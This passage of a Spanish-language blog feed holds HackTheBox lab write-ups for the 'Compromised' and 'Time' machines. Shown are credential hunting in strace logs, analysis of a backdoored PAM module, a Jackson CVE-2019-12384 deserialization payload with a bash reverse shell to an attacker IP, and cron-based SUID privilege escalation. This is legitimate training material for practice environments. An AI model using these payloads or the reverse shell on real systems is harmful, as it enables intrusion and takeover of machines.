lib/dpkg/status-old: Sudo is a program designed to allow a sysadmin to give limited root
lib/dpkg/status-old: You should install ltrace if you need a sysadmin tool for tracking the
lib/dpkg/status-old: common Linux/UNIX commands, reducing the amount of typing sysadmins
lib/mysql/strace-log.dat:22102 03:10:59 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
lib/mysql/strace-log.dat:22102 03:11:00 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
lib/mysql/strace-log.dat:22102 03:11:03 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
lib/mysql/strace-log.dat:22227 03:11:09 stat(&quot;/home/sysadmin/.my.cnf&quot;, 0x7fff97cc5590) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22227 03:11:09 stat(&quot;/home/sysadmin/.mylogin.cnf&quot;, 0x7fff97cc5590) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22102 03:11:09 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
lib/mysql/strace-log.dat:22228 03:11:15 stat(&quot;/home/sysadmin/.my.cnf&quot;, 0x7ffdc5cfb790) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22228 03:11:15 stat(&quot;/home/sysadmin/.mylogin.cnf&quot;, 0x7ffdc5cfb790) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22102 03:11:15 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
lib/mysql/strace-log.dat:22229 03:11:18 stat(&quot;/home/sysadmin/.my.cnf&quot;, 0x7ffcd3f055a0) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22229 03:11:18 stat(&quot;/home/sysadmin/.mylogin.cnf&quot;, 0x7ffcd3f055a0) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22229 03:11:18 readlink(&quot;/home/sysadmin/.mysql_history&quot;, 0x7ffcd3f0a390, 511) = -1 ENOENT (No such file or directory)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Leemos el archivo y filtramos por &lt;code&gt;sysadmin y password&lt;/code&gt;, para tratar de encontrar credenciales en texto claro.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mysql@compromised:/var$ cat lib/mysql/strace-log.dat | grep -iE &quot;sysadmin|password&quot;
22102 03:10:59 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
22102 03:11:00 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
22102 03:11:03 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
22102 03:11:06 write(2, &quot;mysql -u root --password='3*NLJE&quot;..., 39) = 39
22227 03:11:09 execve(&quot;/usr/bin/mysql&quot;, [&quot;mysql&quot;, &quot;-u&quot;, &quot;root&quot;, &quot;--password=3*NLJE32I$Fe&quot;], 0x55bc62467900 /* 21 vars */) = 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Encontramos una credencial que si la validamos corresponde al usuario &lt;code&gt;sysadmin&lt;/code&gt;, ahora podemos ir a su directorio personal y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mysql@compromised:/var$ su sysadmin
Password: 
sysadmin@compromised:/var$ whoami
sysadmin
sysadmin@compromised:/var$ cd /home/sysadmin/
sysadmin@compromised:~$ cat user.txt 
e0915cc0811946d4d341100789b6592e
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como la maquina se llama &lt;code&gt;compromised&lt;/code&gt;, nos da una pista de que la maquina previamente ya fue comprometida, por lo tanto puedo pensar que para garantia de una escalada de privilegios se pudo dejar un &lt;code&gt;rootkit&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Rootkit: Un rootkit es un tipo de software malicioso diseñado para dar la capacidad de introducirse en un dispositivo y hacerse con el control del mismo. Por lo general, los rootkits afectan el software o el sistema operativo del dispositivo que infectan, pero algunos pueden actuar sobre su hardware o firmware. Los rootkits operan en segundo plano, sin dar muestras de que están activos.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Para poder detectarlo vamos a usar &lt;code&gt;linpeas.sh&lt;/code&gt; del repositorio de &lt;code&gt;carlospolop&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/releases/tag/20230611-b11e87f7&quot;&gt;https://github.com/carlospolop/PEASS-ng/releases/tag/20230611-b11e87f7&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ejecutamos el &lt;code&gt;linpeas&lt;/code&gt; y encontramos que &lt;code&gt;.pam_unix.so&lt;/code&gt; se encuentra oculto.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;pam_unix.so: Este es el módulo estándar de autenticación de Unix. Utiliza llamadas estándar de las bibliotecas del sistema para recuperar y establecer la información de la cuenta, así como la autenticación. Usualmente esto se obtiene del archivo /etc/passwd y del archivo /etc/shadow también si shadow está habilitado.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Como vemos el &lt;code&gt;pam_unix&lt;/code&gt; toca temas de autenticación, vamos a traernoslo a nuestro equipo y analizarlo. Para ello vamos a hacer un bae64 del archivo y decodearlo en nuestro equipo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sysadmin@compromised:/lib/x86_64-linux-gnu/security$ base64 -w 0 .pam_unix.so; echo
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez tengamos el archivo en nuestro equipo vamos a examinarlo con &lt;code&gt;radare2&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ file pam_unix.so
pam_unix.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=52d069272a0900ed4963258eab93237d38c6d1c4, with debug_info, not stripped
❯ radare2 pam_unix.so
Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
 -- Select your architecture with: 'e asm.arch=&amp;lt;arch&amp;gt;' or r2 -a from the shell
[0x000025c0]&amp;gt; aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze all functions arguments/locals
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information (aanr)
[x] Integrate dwarf function information.
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x000025c0]&amp;gt; afl
0x000025c0    4 50   -&amp;gt; 40   entry0
0x00002c70   28 732  -&amp;gt; 681  dbg.pam_sm_acct_mgmt
0x00002f70   34 670  -&amp;gt; 633  dbg.pam_sm_authenticate
0x00004390   13 222  -&amp;gt; 210  dbg.pam_sm_close_session
0x00003210    6 116          dbg.pam_sm_setcred
0x00003750  104 2863 -&amp;gt; 2805 dbg.pam_sm_chauthtok
0x00004280   13 262  -&amp;gt; 256  dbg.pam_sm_open_session
[0x000025c0]&amp;gt; s dbg.pam_sm_authenticate
[0x00002f70]&amp;gt; pdf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Analizando vemos una intrucción que hace referencia a &lt;code&gt;pam_unix_auth.c&lt;/code&gt;, con lo que parece ser una credencial, en dos partes similar al formato de una credencial que previamente obtuvimos &lt;code&gt;zlke~U3Env82m2-&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Validamos y efectivamente la credencial corresponde al usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sysadmin@compromised:/lib/x86_64-linux-gnu/security$ su root
Password: 
root@compromised:/lib/x86_64-linux-gnu/security# whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que nos queda por hacer es dirigirnos al directorio personal del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@compromised:/lib/x86_64-linux-gnu/security# cd /root/
root@compromised:~# cat root.txt 
e62293eadbdb5c168b024782d6943394
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Tue, 13 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Compromissed</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Compromissed</guid>
        
        <category>Information leaked</category>
        
        <category>bypass disable functions php</category>
        
        <category>litecart exploit</category>
        
        <category>tty interactive</category>
        
        <category>enumeration sql</category>
        
        <category>UDF</category>
        
        <category>log filter</category>
        
        <category>rootkit</category>
        
        <category>linpeas</category>
        
        <category>pamunix</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Time - htb writeup</title>
        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Time&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una &lt;code&gt;linux&lt;/code&gt; dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de &lt;code&gt;Jackson CVE-2019-12384&lt;/code&gt;, y aprovecharemos la vulnerabilidad &lt;code&gt;SSRF&lt;/code&gt; derivandola en una ejecucion remota de comandos &lt;code&gt;RCE&lt;/code&gt; que nos dara acceso al sistema, para que finalmente aprovechandonos de una tarea &lt;code&gt;Cron&lt;/code&gt; podamos obtener acceso como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Time
❯ ls
 Time
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.214
PING 10.10.10.214 (10.10.10.214) 56(84) bytes of data.
64 bytes from 10.10.10.214: icmp_seq=1 ttl=63 time=133 ms

--- 10.10.10.214 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 133.374/133.374/133.374/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.214 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 20:48 GMT
Initiating SYN Stealth Scan at 20:48
Scanning 10.10.10.214 [65535 ports]
Discovered open port 80/tcp on 10.10.10.214
Discovered open port 22/tcp on 10.10.10.214
Completed SYN Stealth Scan at 20:49, 17.83s elapsed (65535 total ports)
Nmap scan report for 10.10.10.214
Host is up, received user-set (0.15s latency).
Scanned at 2023-06-12 20:48:51 GMT for 18s
Not shown: 65476 closed tcp ports (reset), 57 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.97 seconds
           Raw packets sent: 87623 (3.855MB) | Rcvd: 86271 (3.451MB)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver que los puertos que se encuentran abiertos son el puerto &lt;code&gt;22 ssh&lt;/code&gt; y el &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.214 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 20:49 GMT
Nmap scan report for 10.10.10.214
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Online JSON parser
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 8.2p1 Ubuntu 4ubuntu0.1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.41&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Seguidamente vamos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver por consola el gestor de contenido de la pagina web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ whatweb http://10.10.10.214
http://10.10.10.214 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.214], JQuery[3.2.1], Script, Title[Online JSON parser]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta nos reporta que se trata de un &lt;code&gt;JSON parser&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vamos a abrir la web y vemos que la pagina efectivamente es un &lt;code&gt;JSON parser&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Time/time1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos una opcion de &lt;code&gt;Beautify&lt;/code&gt; que al pasarle datos en &lt;code&gt;JSON&lt;/code&gt; nos lo muestra de manera mas estetica.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Time/time2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dentro de las opciones tambien podemos ver una de &lt;code&gt;Validate (Beta)&lt;/code&gt;,y si procesamos una comilla nos arroja un error referente a &lt;code&gt;jackson java&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Time/time4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Investigando un poco encontramos que existe una vulnerabilidad a una libreria &lt;code&gt;jackson&lt;/code&gt; que se usa para la deserealizacion &lt;code&gt;JSON&lt;/code&gt; y mediante ello podemos realizar ataques de &lt;code&gt;SSRF&lt;/code&gt; y derivarlo a una ejecucion remota de comandos.&lt;/p&gt;

&lt;p&gt;Si deseas entender a mayor detalle la vulnerabilidad te dejo el siguiente articulo:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&quot;&gt;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para explotar esta vulnerabilidad debemos crear un archivo &lt;code&gt;inject.sql&lt;/code&gt; con el siguiente contenido:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {&quot;bash&quot;, &quot;-c&quot;, cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\A&quot;);
	return s.hasNext() ? s.next() : &quot;&quot;;  }
$$;
CALL SHELLEXEC('bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.3/443 0&amp;gt;&amp;amp;1')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En la función &lt;code&gt;shellexec&lt;/code&gt;, introducimos el codigo que queremos que se ejecute cuando suceda la desearialización. En este caso introduciremos una instrucción en &lt;code&gt;bash&lt;/code&gt; que nos permita obtener una reverse shell.&lt;/p&gt;

&lt;p&gt;Lo siguiente ejecutar lo siguiente instrucción en el &lt;code&gt;JSON PARSER&lt;/code&gt;, donde especificaremos nuestra ip, donde nos compartiremos el archivo &lt;code&gt;inject.sql&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Time/time5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora nos compartimos el archivo, usando python.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seguidamente nos ponemos en escucha en el puerto especifico, en este caso el &lt;code&gt;443&lt;/code&gt; y enviamos la instrucción.&lt;/p&gt;

&lt;p&gt;Recibimos la petición&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.214 - - [12/Jun/2023 23:13:26] &quot;GET /inject.sql HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y obnenemos acceso como el usuario &lt;code&gt;pericles&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.214.
Ncat: Connection from 10.10.10.214:38128.
bash: cannot set terminal process group (857): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ whoami
whoami
pericles
pericles@time:/var/www/html$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como siempre vamos a configurar nuestra &lt;code&gt;tty&lt;/code&gt; full interactiva&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
pericles@time:/var/www/html$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
pericles@time:/var/www/html$ export TERM=xterm
pericles@time:/var/www/html$ export SHELL=bash 
pericles@time:/var/www/html$ stty rows 45 columns 184
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nos dirigimos al directorio personal del usuario &lt;code&gt;pericles&lt;/code&gt; y visializamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/var/www/html$ cd /home
pericles@time:/home$ ls
pericles
pericles@time:/home$ cd pericles/
pericles@time:/home/pericles$ ls
snap  user.txt
pericles@time:/home/pericles$ cat user.txt 
5598d4c823ca1aadd34004c1ed4cbfc8
pericles@time:/home/pericles$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para poder elevar privilegios primeramente a enumerar ver la lista de temporalizadores para ver información util sobre las tareas programadas en el sistema, utilzando el comando &lt;code&gt;systenctl list-timers&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/home/pericles$ systemctl list-timers
NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES                     
Mon 2023-06-12 23:21:41 UTC 3s left       Mon 2023-06-12 23:21:31 UTC 6s ago               timer_backup.timer           timer_backup.service          
Mon 2023-06-12 23:39:00 UTC 17min left    Mon 2023-06-12 23:09:00 UTC 12min ago            phpsessionclean.timer        phpsessionclean.service       
Tue 2023-06-13 00:00:00 UTC 38min left    Mon 2023-06-12 20:41:25 UTC 2h 40min ago         logrotate.timer              logrotate.service             
Tue 2023-06-13 00:00:00 UTC 38min left    Mon 2023-06-12 20:41:25 UTC 2h 40min ago         man-db.timer                 man-db.service                
Tue 2023-06-13 00:09:59 UTC 48min left    Tue 2021-02-09 14:42:14 UTC 2 years 4 months ago motd-news.timer              motd-news.service             
Tue 2023-06-13 03:56:23 UTC 4h 34min left Thu 2020-10-22 18:44:20 UTC 2 years 7 months ago apt-daily.timer              apt-daily.service             
Tue 2023-06-13 06:16:25 UTC 6h left       Mon 2023-06-12 21:40:37 UTC 1h 41min ago         apt-daily-upgrade.timer      apt-daily-upgrade.service     
Tue 2023-06-13 14:30:45 UTC 15h left      Mon 2023-06-12 22:46:51 UTC 34min ago            fwupd-refresh.timer          fwupd-refresh.service         
Tue 2023-06-13 20:56:20 UTC 21h left      Mon 2023-06-12 20:56:20 UTC 2h 25min ago         systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2023-06-18 03:10:37 UTC 5 days left   Mon 2023-06-12 20:42:05 UTC 2h 39min ago         e2scrub_all.timer            e2scrub_all.service           
Mon 2023-06-19 00:00:00 UTC 6 days left   Mon 2023-06-12 20:41:25 UTC 2h 40min ago         fstrim.timer                 fstrim.service                
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obervamos que se esta ejecutando un &lt;code&gt;timer_backup&lt;/code&gt;, ahora para enumerar los procesos que se estan ejecutando en el sistema, vamos a crearnos un pequeño script en bash de nombre &lt;code&gt;procmon.sh&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
  new_process=$(ps -eo user,command)
  diff &amp;lt;(echo &quot;$old_process&quot;) &amp;lt;(echo &quot;$new_process&quot;) | grep &quot;[\&amp;gt;\&amp;lt;]&quot; | grep -vE &quot;procmon|command|kworker&quot; 
  old_process=$new_process
done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo ejecutamos en la maquina victima y vemos que el usuario &lt;code&gt;root&lt;/code&gt; esta ejecutando el arhivo &lt;code&gt;timer_backup.sh&lt;/code&gt; a intervalos regulares de tiempo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root     /bin/sh -e /usr/lib/php/sessionclean
root     /bin/sh -e /usr/lib/php/sessionclean
root     /lib/systemd/systemd-udevd
root     /lib/systemd/systemd-udevd
root     /lib/systemd/systemd-udevd
root     /bin/bash /usr/bin/timer_backup.sh
root     zip -r website.bak.zip /var/www/html
root     /bin/bash /usr/bin/timer_backup.sh
root     zip -r website.bak.zip /var/www/html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Viendo las propiedades del archivo, vemos que somos propieatarios, por tanto tenemos permiso de escritura.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/home/pericles$ ls -l /usr/bin/timer_backup.sh
-rwxrw-rw- 1 pericles pericles 88 Jun 12 23:40 /usr/bin/timer_backup.sh
pericles@time:/home/pericles$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente que haremos sera modificar el archivo, añadiendole una instruccion que nos otorgue el privilegio &lt;code&gt;suid&lt;/code&gt; a la &lt;code&gt;bash&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/home/pericles$ cat /usr/bin/timer_backup.sh
#!/bin/bash
chmod  u+s /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que el usuario &lt;code&gt;root&lt;/code&gt; nos ejecutara el archivo despues de unos segundos verificamos si nos asigno el permiso correspondiente a la &lt;code&gt;bash&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/home/pericles$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Feb 25  2020 /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo unico que nos queda por hacer seria ejecutar &lt;code&gt;bash -p&lt;/code&gt; y nos convertiriamos en el usuario &lt;code&gt;root&lt;/code&gt;, ahora vamos a su directorio personal y visualizamos la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/home/pericles$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat root.txt
a527d7fbd3e113aeb96d956af2900de8
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Mon, 12 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Time</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Time</guid>
        
        <category>Jackson CVE-2019-12384 Exploitation</category>
        
        <category>SSRF to RCE</category>
        
        <category>Abusing Cron Job</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Monitors - htb writeup</title>
